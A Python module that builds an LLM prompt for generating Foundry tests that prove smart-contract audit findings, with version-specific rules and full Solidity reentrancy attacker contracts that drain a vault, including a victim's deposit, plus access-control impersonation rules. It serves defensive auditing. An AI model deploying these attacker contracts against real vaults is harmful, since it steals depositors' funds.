import re


def _pragma_version(source: str) -> str:
    m = re.search(r"pragma\s+solidity\s+([^;]+);", source)
    return m.group(1).strip() if m else "unknown"


def build_test_gen_prompt(source: str, finding: dict) -> str:
    pragma = _pragma_version(source)
    is_08_plus = any(v in pragma for v in ("^0.8", ">=0.8", "0.8.", "^0.9", ">=0.9"))

    solidity_version_note = f"""
## Solidity Version: {pragma}
{"### CRITICAL — Solidity 0.8+ arithmetic is CHECKED by default" if is_08_plus else "### NOTE — Pre-0.8: arithmetic is UNCHECKED (overflow/underflow wraps silently)"}
""".strip()

    reentrancy_note = """
## Reentrancy Test Rules (ALWAYS apply these for REENTRANCY findings)

### Step 1 — identify the balance zeroing style in the source contract

Read the withdraw function body carefully. There are two patterns, and they have DIFFERENT
safety properties in Solidity 0.8:

PATTERN A — assignment zeroing: `balances[msg.sender] = 0;`
  Setting a uint256 to 0 multiple times is a no-op — no underflow is possible.
  If the reentry loop runs N times (each call setting balances to 0), all N
  `= 0` assignments succeed. The attacker can drain ALL vault ETH including victim funds.
  → USE the victim-deposit test structure (see PATTERN A below)

PATTERN B — subtraction zeroing: `balances[msg.sender] -= amount;`
  Each call in the reentry stack decrements the balance. The first reentry sets it to 0;
  every subsequent outer-stack unwind tries `0 - amount` → UNDERFLOW PANIC → entire tx reverts.
  The attacker can NEVER drain victim funds with this pattern in Solidity 0.8.
  → USE the no-victim-ETH test structure (see PATTERN B below)

---

### PATTERN A — assignment zeroing (balances[user] = 0)

The victim deposits ETH first, then the attacker deposits and attacks.
Since `= 0` is safe to run multiple times, the reentry loop fires until the vault is empty,
stealing both the attacker's deposit AND the victim's funds.

The withdraw() function in this pattern typically takes NO amount argument — it withdraws
the entire `balances[msg.sender]` in one shot, then zeros it out.

```
function setUp() public {{
    vault = new <ContractName>();
    attacker = new Attacker(address(vault));
}}

function testReentrancyDrainsVictimFunds() public {{
    // Victim deposits into the vault
    address victim = makeAddr("victim");
    vm.deal(victim, 1 ether);
    vm.prank(victim);
    vault.deposit{{value: 1 ether}}();
    assertEq(vault.getBalance(), 1 ether); // victim's funds are in the vault

    // Attacker deposits the same amount and attacks
    vm.deal(address(attacker), 1 ether);
    attacker.attack{{value: 1 ether}}();

    // Attacker drained the vault including victim's 1 ETH
    assertEq(vault.getBalance(), 0 ether);         // vault fully drained
    assertEq(address(attacker).balance, 2 ether);  // attacker has 2× their deposit
}}
```

Attacker contract for PATTERN A (withdraw takes no arguments):
```
contract Attacker {{
    <ContractName> public vault;
    uint256 public withdrawAmount;

    constructor(address _vault) {{
        vault = <ContractName>(_vault);
    }}

    function attack() external payable {{
        withdrawAmount = msg.value;
        vault.deposit{{value: msg.value}}();
        vault.withdraw();
    }}

    receive() external payable {{
        // Keep draining until vault can no longer cover one withdrawal
        if (address(vault).balance >= withdrawAmount) {{
            vault.withdraw();
        }}
    }}
}}
```

Why this works: first reentry fires when vault still holds victim ETH (vault.balance >= withdrawAmount).
Each call zeroes balances[attacker] — re-zeroing is safe. Loop exits when vault is empty.

---

### PATTERN B — subtraction zeroing (balances[user] -= amount)

The vault must contain NO extra ETH — only the attacker's own deposit.
Any extra ETH causes the reentry loop to fire more times than balances[attacker] covers,
producing an underflow panic that reverts the entire transaction.

```
function setUp() public {{
    vault = new <ContractName>();
    attacker = new Attacker(address(vault));
    // DO NOT seed vault with extra ETH here
}}

function testReentrancyCEIViolation() public {{
    vm.deal(address(attacker), 1 ether);
    attacker.attack{{value: 1 ether}}();
    // receive() fired while balances[attacker] was still non-zero (CEI violation proven)
    // Loop ran once: vault emptied → guard stopped re-entry → single clean decrement
    assertEq(address(attacker).balance, 1 ether); // got back their deposit
    assertEq(vault.getBalance(), 0 ether);        // vault drained
}}
```

Attacker contract for PATTERN B (withdraw takes an amount argument):
```
contract Attacker {{
    <ContractName> public vault;
    uint256 public attackAmount;

    constructor(address _vault) {{
        vault = <ContractName>(_vault);
    }}

    function attack() external payable {{
        attackAmount = msg.value;
        vault.deposit{{value: msg.value}}();
        vault.withdraw(msg.value);
    }}

    receive() external payable {{
        if (address(vault).balance >= attackAmount) {{
            vault.withdraw(attackAmount);
        }}
    }}
}}
```

---

DO NOT:
- Use vm.expectRevert anywhere
- Add an UncheckedVault, UncheckedBank, or any contract variant
- Add a second test
- Use vm.deal to seed the vault directly with ETH (bypasses the balances mapping — use deposit())

### ETH seeding
CORRECT: `vm.deal(addr, amount)` then `vm.prank(addr); vault.deposit{value: amount}();`
WRONG:   `vm.deal(address(vault), amount)` — sets raw ETH without touching balances mapping
WRONG:   `payable(address(vault)).transfer(amount)` — reverts if vault has no receive()
""".strip()

    access_control_note = """
## Access Control Test Rules
- Use `vm.prank(address(0xBEEF))` to impersonate an unauthorized caller.
- Assert the call SUCCEEDS (it should not — that IS the bug).
- Then assert state changed in a way only an owner should cause.
""".strip()

    category = finding.get("category", "")
    category_note = reentrancy_note if category == "REENTRANCY" else (
        access_control_note if category == "ACCESS_CONTROL" else ""
    )

    return f"""
## Vulnerability to Test
Title: {finding["title"]}
Severity: {finding["severity"]}
Category: {category}
Description: {finding["description"]}
Exploit Scenario: {finding.get("exploit_scenario", "")}

{solidity_version_note}

{category_note}

## Contract Source
```solidity
{source[:4000]}
```

## General Foundry Rules (always follow)
1. Seed ETH with `vm.deal(addr, amount)` — never `addr.transfer(amount)` (fails if no receive()).
2. Impersonate addresses with `vm.prank(addr)` or `vm.startPrank(addr)`.
3. Check whether the contract has a `receive()` or `fallback()` before sending raw ETH to it.
4. Every test function name must start with `test`.
5. Include the full attacker contract inline in the same file.
6. The test must compile against forge-std (`import "forge-std/Test.sol"`).

## Task
Generate a Foundry test file that proves the vulnerability is real and exploitable (or shows
exactly why it reverts in this Solidity version). Apply all version-specific and
category-specific rules above.

Required JSON output:
{{
  "test_stub": "string (complete Foundry .t.sol file, ready to compile with forge test)"
}}
""".strip()
